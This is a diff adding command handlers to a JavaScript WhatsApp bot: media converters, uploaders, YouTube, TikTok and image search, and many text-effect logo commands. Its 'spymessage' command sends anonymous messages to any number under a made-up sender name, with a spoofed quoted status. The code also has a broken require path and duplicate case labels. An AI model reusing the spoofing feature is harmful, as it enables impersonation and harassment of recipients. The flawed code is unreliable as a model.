+            if (!quoted) throw `Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`
+            m.reply(mess.wait)
+            let media = await quoted.download()
+            let { toPTT } = require('./lib/converter')
+            let audio = await toPTT(media, 'mp4')
+            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
+            }
+            break
+            case 'togif': {
+                if (!quoted) throw 'Reply Image'
+                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
+                m.reply(mess.wait)
+		let { webp2mp4File } = require('./lib/uploader')
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                let webpToMp4 = await webp2mp4File(media)
+                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
+                await fs.unlinkSync(media)
+            }
+            break
+	        case 'tourl': {
+                m.reply(mess.wait)
+		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                if (/image/.test(mime)) {
+                    let anu = await TelegraPh(media)
+                    m.reply(util.format(anu))
+                } else if (!/image/.test(mime)) {
+                    let anu = await UploadFileUgu(media)
+                    m.reply(util.format(anu))
+                }
+                await fs.unlinkSync(media)
+            }
+            break
+	case 'spymessage': case 'menfess': {
+		        if (m.isGroup) throw ('feature cannot be used in groups')
+            	if (!text) throw `Example : ${prefix + command} 916909xxxxx|fictious name|message`
+            var mon = args.join(' ')
+            var m1 = mon.split("|")[0]
+            var m2 = mon.split("|")[1]
+            var m3 = mon.split("|")[2]
+               let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${author}`,jpegThumbnail: thumb}}}
+               let mq1 = m1 + '@s.whatsapp.net'
+               let kawk = ('SECRET MESSAGE')
+               let ownernya = ownernomer + '@s.whatsapp.net'
+               let me = m.sender
+               let ments = [mq1, ownernya, me]
+               let pjtxt = `Message From : ${m2} \nFor : @${mq1.split('@')[0]}\n\n${m3}`
+               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🔖¤' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m1 + '@s.whatsapp.net', buttons, pjtxt, kawk, m, {mentions: ments, quoted: kafloc})
+            let akhji = `Message Sent\nTo @${mq1.split('@')[0]}`
+            await XeonBotInc.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments})
+            }
+            break
+	    case 'yts': case 'ytsearch': {
+                if (!text) throw `Example : ${prefix + command} story wa anime`
+                let yts = require("yt-search")
+                let search = await yts(text)
+                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
+                let no = 1
+                for (let i of search.all) {
+                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Upload At : ${i.ago}\n${themeemoji} Author : ${i.author.name}\n${themeemoji} Url : ${i.url}\n\n🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€🔖”€\n\n`
+                }
+                XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
+            }
+            break
+        case 'google': {
+                if (!text) throw `Example : ${prefix + command} fatih arridho`
+                let google = require('google-it')
+                google({'query': text}).then(res => {
+                let teks = `Google Search From : ${text}\n\n`
+                for (let g of res) {
+                teks += `${themeemoji} *Title* : ${g.title}\n`
+                teks += `${themeemoji} *Description* : ${g.snippet}\n`
+                teks += `${themeemoji} *Link* : ${g.link}\n\n🔖”\n\n`
+                } 
+                m.reply(teks)
+                })
+                }
+                break
+        case 'gimage': {
+       if (!text) throw `Example : ${prefix + command} kaori cicak`
+        anu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
+        n = anu.result
+        images = n[Math.floor(Math.random() * n.length)]
+        let buttons = [
+                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: images },
+                    caption: `*------- GIMAGE SEARCH -------*
+🔖¤  *Query* : ${text}
+🔖”— *Media Url* : ${images}`,
+                    footer: XeonBotInc.user.name,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+        }
+        break
+	    case 'play': case 'ytplay': {
+                if (!text) throw `Example : ${prefix + command} story wa anime`
+                let yts = require("yt-search")
+                let search = await yts(text)
+                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
+                let buttons = [
+                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '🔊 Audio'}, type: 1},
+                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '📽️ Video'}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: anu.thumbnail },
+                    caption: `
+${themeemoji} Title : ${anu.title}
+${themeemoji} Ext : Search
+${themeemoji} ID : ${anu.videoId}
+${themeemoji} Duration : ${anu.timestamp}
+${themeemoji} Viewers : ${anu.views}
+${themeemoji} Upload At : ${anu.ago}
+${themeemoji} Author : ${anu.author.name}
+${themeemoji} Channel : ${anu.author.url}
+${themeemoji} Description : ${anu.description}
+${themeemoji} Url : ${anu.url}`,
+                    footer: botname,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
+	    case 'ytmp3': case 'ytaudio': {
+                let { yta } = require('./lib/y2mate')
+                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
+                let quality = args[1] ? args[1] : '128kbps'
+                let media = await yta(text, quality)
+                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
+                XeonBotInc.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
+                XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
+            }
+            break
+            case 'ytmp4': case 'ytvideo': {
+                let { ytv } = require('./lib/y2mate')
+                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
+                let quality = args[1] ? args[1] : '360p'
+                let media = await ytv(text, quality)
+                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
+                XeonBotInc.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '360p'}` }, { quoted: m })
+            }
+            break
+            case 'pinterest': {
+                m.reply(mess.wait)
+		let { pinterest } = require('./lib/scraper')
+                anu = await pinterest(text)
+                result = anu[Math.floor(Math.random() * anu.length)]
+                XeonBotInc.sendMessage(m.chat, { image: { url: result }, caption: `${themeemoji} Media Url : `+result }, { quoted: m })
+            }
+            break
+            case 'waifu': {
+            	m.reply(mess.wait)
+                anu = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
+                buffer = await getBuffer(anu.url)
+                let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `animemenu`, buttonText: {displayText: '🔖Back'}, type: 1}]
+                let buttonMessage = {
+                    image: buffer,
+                    caption: `Random Waifu`,
+                    footer: botname,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
+	    case 'couplepp': {
+                m.reply(mess.wait)
+                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
+                let random = anu[Math.floor(Math.random() * anu.length)]
+                XeonBotInc.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
+                XeonBotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
+            }
+	    break
+            case 'coffee': case 'kopi': {
+            let buttons = [
+                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: 'https://coffee.alexflipnote.dev/random' },
+                    caption: `🔖˜• Random Coffee`,
+                    footer: botname,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
+            case 'wallpaper': {
+                if (!text) throw 'Enter Query Title'
+		let { wallpaper } = require('./lib/scraper')
+                anu = await wallpaper(text)
+                result = anu[Math.floor(Math.random() * anu.length)]
+		let buttons = [
+                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: result.image[0] },
+                    caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
+                    footer: botname,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
+            case 'gcsearch': case 'searchgc': {
+              if (!text) throw 'Enter Query Title'
+                anu = await fetchJson(`https://api.akuari.my.id/search/carigc?query=${text}`)
+                n = anu.result
+                result = n[Math.floor(Math.random() * n.length)]
+                let jwbn = `*Name : ${result.nama}\n*Link : ${result.link}*`
+		let buttons = [{ buttonId: `gcsearch ${text}`, buttonText: { displayText: 'Next' }, type: 1 },{ buttonId: 'donate', buttonText: { displayText: '🔖™Donate' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jwbn, botname, m, {quoted: fgclink})
+            }
+            break
+            case 'wikimedia': {
+                if (!text) throw 'Enter Query Title'
+		let { wikimedia } = require('./lib/scraper')
+                anu = await wikimedia(text)
+                result = anu[Math.floor(Math.random() * anu.length)]
+                let buttons = [
+                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
+                ]
+                let buttonMessage = {
+                    image: { url: result.image },
+                    caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
+                    footer: botname,
+                    buttons: buttons,
+                    headerType: 4
+                }
+                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+            }
+            break
+	   
+            case 'umma': case 'ummadl': {
+	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
+                let { umma } = require('./lib) scraper')
+		let anu = await umma(isUrl(text)[0])
+		if (anu.type == 'video') {
+		    let buttons = [
+                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '🔊 Audio'}, type: 1},
+                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '📽️ Video'}, type: 1}
+                    ]
+		    let buttonMessage = {
+		        image: { url: anu.author.profilePic },
+			caption: `
+${themeemoji} Title : ${anu.title}
+${themeemoji} Author : ${anu.author.name}
+${themeemoji} Like : ${anu.like}
+${themeemoji} Caption : ${anu.caption}
+${themeemoji} Url : ${anu.media[0]}
+Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
+`,
+			footer: XeonBotInc.user.name,
+			buttons,
+			headerType: 4
+		    }
+		    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
+		} else if (anu.type == 'image') {
+		    anu.media.map(async (url) => {
+		        XeonBotInc.sendMessage(m.chat, { image: { url }, caption: `${themeemoji} Title : ${anu.title}\n${themeemoji} Author : ${anu.author.name}\n${themeemoji} Like : ${anu.like}\n${themeemoji} Caption : ${anu.caption}` }, { quoted: m })
+		    })
+		}
+	    }
+	    break
+        case 'ringtone': {
+		if (!text) throw `Example : ${prefix + command} black rover`
+        let { ringtone } = require('./lib/scraper')
+		let anu = await ringtone(text)
+		let result = anu[Math.floor(Math.random() * anu.length)]
+		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
+	    }
+	    break
+
+case 'tiktoknowm':
+			case 'tiktok':
+			case 'tt':
+			    if (!text) return m.reply('Enter the link')
+				let p = await fdl.downloader.tiktok(q)
+				let nih = ` Here you go! 🏃🏻‍♂️
+
+If you want mp3, click the button below`
+				let buttons = [
+                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '🔊 Audio'}, type: 1}
+                ]
+                let buttonMessage = {
+                    video: { url: p.nowm },
+                    caption: nih,
+                    title: 'TIKTOK DOWNLOADER',
+                    footer: botname,
+                    buttons: buttons,
+                    headerType: 5
+                }
+                XeonBotInc.sendMessage(from, buttonMessage, { quoted: m })
+            
+			    break
+case 'tiktokmp3': 
+			case 'tiktokaudio': {
+				if (!text) return m.reply('Enter the link')
+				let aud = await fdl.downloader.tiktok(text)
+				let cap = `Here you go! 🏃🏻‍♂️🏃🏻‍♂️`
+				XeonBotInc.sendMessage(from, { caption: cap, image: {url: aud.thumbnail}})
+				XeonBotInc.sendMessage(from, { audio: { url: aud.audio }, mimetype: 'audio/mpeg'}, { quoted: m })
+				}
+				break
+case 'setbio':
+if (!q) throw 'Send orders *#setbio text*'
+XeonBotInc.setStatus(`${q}`)
+throw mess.success
+break
+case 'resetlinkgc':
+case 'resetlinkgroup':
+case 'resetlinkgrup':
+case 'revoke':
+case 'resetlink':
+case 'resetgrouplink':
+case 'resetgclink':
+case 'resetgruplink': {
+if (!m.isGroup) throw mess.group
+if (!isBotAdmins) throw mess.botAdmin
+if (!isAdmins && !isCreator) throw mess.admin
+XeonBotInc.groupRevokeInvite(m.chat)
+}
+break
+case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
+case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
+case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
+case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
+case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
+case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
+ case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
+case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
+case 'lava': case 'rock': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
+ case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
+             if (!q) throw `Example : ${prefix + command} ${global.ownername}`
+             m.reply(mess.wait)
+             let link
+             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
+             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
+             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
+             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
+             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
+             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
+             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
+             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
+             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
+             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
+             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
+             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
+             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
+             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
+             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
+             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
+             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
+             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
+             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
+             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
+             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
+             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
+             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
+             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
+             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
+             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
+             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
+             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
+             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
+             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
+             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
+             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
+             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
+             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
+             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
+             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
+             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
+             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
+             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
+             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
+             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
+             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
+             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
+             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
+             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
+             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
+             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
+             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
+             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
+             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
+             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
+             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
+             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
+             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
+             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
+             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
+                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
+             let anu = await maker.textpro(link, q)
+                XeonBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `Made by ${global.botname}` }, { quoted: m })
+             }
+             break
+case'glitch3':
+if(!q) throw `Use ${prefix + command} text|text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case '3dbox':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
+    `${q}`,])
+.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+.catch((err) => console.log(err));
+break
+
+case 'waterdrop':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+ maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
+     `${q}`,])
+    .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+    .catch((err) => console.log(err));
+     break
+
+case 'lion2':
+  if(!q) throw `Use ${prefix + command} text`
+  m.reply(mess.wait)
+  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
+      `${q}`,])
+     .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+     .catch((err) => console.log(err));
+     break
+
+case 'papercut':
+      if(!q) throw `Use ${prefix + command} text`
+      m.reply(mess.wait)
+      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
+`${q}`,])
+         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+         .catch((err) => console.log(err));
+         break
+
+case 'transformer':
+      if(!q) throw `Use ${prefix + command} text`
+      m.reply(mess.wait)
+      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
+`${q}`,])
+.then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+.catch((err) => console.log(err));
+break
+   
+case 'harrypot':
+       if(!q) throw `Use ${prefix + command} text|text`
+       m.reply(mess.wait)
+       teks1 = q.split("|")[0]
+       teks2 = q.split("|")[1]
+       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
+ `${teks1}`,`${teks2}`])
+ .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+ .catch((err) => console.log(err));
+ break
+
+case 'neondevil':
+      if(!q) throw `Use ${prefix + command} text`
+      m.reply(mess.wait)
+      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
+`${q}`,])
+         .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+         .catch((err) => console.log(err));
+         break
+
+case '3dstone':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case '3davengers':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'thunder':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+   
+case 'window':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+   case 'blackpinkneon':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'graffiti':
+   case 'grafiti':
+if(!q) throw `Use ${prefix + command} text|text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'pornhub2':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'blackpink2':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'glitch':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'glitch2':
+if(!q) throw `Use ${prefix + command} text|text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'glitch3':
+if(!q) throw `Use ${prefix + command} text|text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case '3dspace':
+if(!q) throw `Use ${prefix + command} text|text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'lion':
+if(!q) throw `Use ${prefix + command} text|text`
+m.reply(mess.wait)
+teks1 = q.split("|")[0]
+teks2 = q.split("|")[1]
+maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
+    `${teks1}`,`${teks2}`])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case '3dneon':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'neon':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
+    `${q}`,])
+  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .catch((err) => console.log(err));
+   break
+
+case 'greenneon':
+if(!q) throw `Use ${prefix + command} text`
+m.reply(mess.wait)
+maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
+    `${q}`,])
